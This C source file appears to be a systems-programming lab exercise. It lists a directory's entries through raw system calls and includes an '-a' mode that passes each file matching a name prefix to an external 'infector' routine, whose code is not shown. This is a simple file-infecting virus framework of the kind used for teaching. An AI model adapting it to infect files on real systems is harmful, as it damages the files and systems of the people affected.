#include "util.h"

/* System calls */
#define SYS_EXIT 1
#define SYS_READ 3
#define SYS_WRITE 4
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define SYS_GETDENTS 141

/* Flags */
#define STDIN 0
#define STDOUT 1
#define STDERR 2
#define O_RDONLY 0
#define O_RDRW 2
#define O_CREAT 64

#define DT_UNKNOWN 0
#define DT_FIFO 1
#define DT_CHR 2
#define DT_DIR 4
#define DT_BLK 6
#define DT_REG 8
#define DT_LNK 10
#define DT_SOCK 12

extern int system_call();
extern void infection();
extern void infector(char *FileName);

typedef struct linux_dirent {
    unsigned long  ino;     /* Inode number */
    unsigned long  off;     /* Offset to next linux_dirent */
    unsigned short reclen;  /* Length of this linux_dirent */
    char           name[];  /* Filename (null-terminated) */
                                 /* length is actually (d_reclen - 2 -
                                    offsetof(struct linux_dirent, d_name)) */
} ent;

void printRecordName(ent *record){
    char *str = "File name: ";
    system_call(SYS_WRITE, STDOUT, str, strlen(str));
    system_call(SYS_WRITE, STDOUT, record->name, strlen(record->name));
    system_call(SYS_WRITE, STDOUT, "\n", 1);
}

void printRecordNameWithType(ent *record, char *type){
    char *str = "File name: ";
    system_call(SYS_WRITE, STDOUT, str, strlen(str));
    system_call(SYS_WRITE, STDOUT, record->name, strlen(record->name));
    str = ", File type: ";
    system_call(SYS_WRITE, STDOUT, str, strlen(str));
    system_call(SYS_WRITE, STDOUT, type, strlen(type));
    system_call(SYS_WRITE, STDOUT, "\n", 1);
}


void printAllFiles(int readenBytes, char *ents){
    int i = 0;
    while (i < readenBytes){
        ent *Record = (ent*) (ents+i);
        printRecordName(Record);
        i = i + Record->reclen;
    }
}

void printPrefixFiles(int readenBytes, char *ents, const char *prefix){
    int i = 0;
    while (i < readenBytes){
        ent *Record = (ent*) (ents+i);
        char d_type = *(ents + i + Record->reclen - 1);
        char *type = (d_type == DT_REG) ?  "regular" :
                    (d_type == DT_DIR) ?  "directory" :
                    (d_type == DT_FIFO) ? "FIFO" :
                    (d_type == DT_SOCK) ? "socket" :
                    (d_type == DT_LNK) ?  "symlink" :
                    (d_type == DT_BLK) ?  "block dev" :
                    (d_type == DT_CHR) ?  "char dev" : "???";
        if(strncmp(Record->name,prefix,1) == 0 )
            printRecordNameWithType(Record,type);
        i = i + Record->reclen;
    }
}

void infectAllPrefix(int readenBytes, char *ents, const char *appendPrefix){
    int i = 0;
    while (i < readenBytes){
        ent *Record = (ent*) (ents+i);
        char d_type = *(ents + i + Record->reclen - 1);
        char *type = (d_type == DT_REG) ?  "regular" :
                    (d_type == DT_DIR) ?  "directory" :
                    (d_type == DT_FIFO) ? "FIFO" :
                    (d_type == DT_SOCK) ? "socket" :
                    (d_type == DT_LNK) ?  "symlink" :
                    (d_type == DT_BLK) ?  "block dev" :
                    (d_type == DT_CHR) ?  "char dev" : "???";
        if(strncmp(Record->name,appendPrefix,1) == 0 ){
            system_call(SYS_WRITE,STDERR,"AAA",strlen("AAA")); 
            infector(Record->name);
            printRecordNameWithType(Record,type);
            system_call(SYS_WRITE,STDERR,"AAA",strlen("AAA")); 
        }
        i = i + Record->reclen;
    }
}


int main(int argc, char const *argv[]){   
    /* updating program configuration */
    int partial = 0;
    int append = 0;
    const char *prefix;
    const char *appendPrefix;
    int i;
    for(i=1; i<argc; i++){
        if(strncmp(argv[i],"-p",2)==0) {
            partial = 1;
            prefix = argv[i]+2;
        }else if(strncmp(argv[i],"-a",2)==0) {
            append = 1;
            appendPrefix = argv[i]+2;
        }
    }

    int inputStream = system_call(SYS_OPEN,".",O_RDONLY,0777);
    if(inputStream < 0 ) {
        char *str = "Error openning directory";
        system_call(SYS_WRITE,STDERR,str,strlen(str)); 
        system_call(SYS_EXIT,0x55,0,0);
    }
    char *str = "Flame 2 strikes!\n";
    system_call(SYS_WRITE,STDOUT, str,strlen(str));

    char ents[8192];
    int read = system_call(SYS_GETDENTS,inputStream,ents,8192);
    if(read < 0 ) {
        char *str = "Error reading contents";
        system_call(SYS_WRITE,STDERR,str,strlen(str)); 
        system_call(SYS_EXIT,0x55,0,0);
    }


    if(partial)
        printPrefixFiles(read,ents,prefix);
    else if(append)
        infectAllPrefix(read,ents,appendPrefix);
    else
        printAllFiles(read,ents);

    return 0;

}